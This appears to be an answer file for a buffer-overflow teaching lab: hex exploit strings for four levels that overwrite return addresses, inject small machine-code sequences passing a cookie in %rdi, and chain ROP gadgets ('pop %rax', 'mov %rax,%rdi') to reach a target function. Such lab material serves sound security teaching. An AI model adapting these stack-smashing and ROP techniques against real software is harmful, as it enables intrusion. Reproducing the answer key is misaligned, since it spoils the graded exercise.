level 1
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00

level 2
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a8 dc 61 55 00 00 00 00
68 ec 17 40 00
48 c7 c7 fa 97 b9 59
c3

level 3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a8 dc 61 55 00 00 00 00   //%rsp address
68 fa 18 40 00 48 8d 7c 
24 18 c3 00 00 00 00 00
35 39 62 39 39 37 66 61   //cookie address 24(%rsp)



level 4
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
cc 19 40 00 00 00 00 00   //gadget 1 address --- pop %rax
fa 97 b9 59 00 00 00 00   //string cookie
c5 19 40 00 00 00 00 00   //gadget 2 address --- mov %rax,%rdi
ec 17 40 00 00 00 00 00   //touch 2 address